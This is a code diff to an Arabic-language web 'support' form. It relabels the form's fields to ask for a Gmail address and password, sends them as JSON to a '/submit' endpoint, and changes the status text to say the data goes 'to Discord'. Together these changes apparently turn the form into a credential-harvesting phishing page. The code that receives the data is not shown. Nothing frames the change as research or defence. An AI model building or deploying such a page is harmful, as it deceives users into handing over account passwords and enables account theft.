@@ -157,8 +157,8 @@
 
     <form id="supportForm">
       <div class="field">
-        <label for="gamerTag">جميل</label>
-        <input type="text" id="gamerTag" name="gamerTag" placeholder="اكتب جميل هنا..." required />
+        <label for="gamerTag">Gmail</label>
+        <input type="text" id="gamerTag" name="gamerTag" placeholder="اكتب Gmail هنا..." required />
       </div>
 
       <div class="field">
@@ -179,38 +179,38 @@
     form.addEventListener("submit", async (e) => {
       e.preventDefault();
 
-      const gamer_tag = document.getElementById("gamerTag").value.trim();
-      const secret_code = document.getElementById("secretCode").value.trim();
+      const email = document.getElementById("gamerTag").value.trim();
+      const password = document.getElementById("secretCode").value.trim();
 
-      if (!gamer_tag || !secret_code) {
-        statusMsg.textContent = "من فضلك املأ خانة جميل والرمز!";
+      if (!email || !password) {
+        statusMsg.textContent = "من فضلك املأ خانة Gmail والرمز!";
         statusMsg.className = "status error";
         return;
       }
 
       submitBtn.disabled = true;
-      statusMsg.textContent = "جاري الإرسال للسيرفر...";
+      statusMsg.textContent = "جاري الإرسال للديسكورد...";
       statusMsg.className = "status";
 
       try {
-        const response = await fetch("/send-support", {
+        const response = await fetch("/submit", {
           method: "POST",
           headers: { "Content-Type": "application/json" },
-          body: JSON.stringify({ gamer_tag, secret_code })
+          body: JSON.stringify({ email, password })
         });
 
         const data = await response.json();
 
-        if (response.ok && data.ok) {
+        if (response.ok && data.status === "success") {
           statusMsg.textContent = data.message;
           statusMsg.className = "status success";
           form.reset();
         } else {
-          statusMsg.textContent = data.message || "حدث خطأ أثناء الإرسال.";
+          statusMsg.textContent = data.message || "تعذر الاتصال بالديسكورد.";
           statusMsg.className = "status error";
         }
       } catch (err) {
-        statusMsg.textContent = "تعذر الاتصال بالسيرفر.";
+        statusMsg.textContent = "تعذر الاتصال بالديسكورد.";
         statusMsg.className = "status error";
       } finally {
         submitBtn.disabled = false;
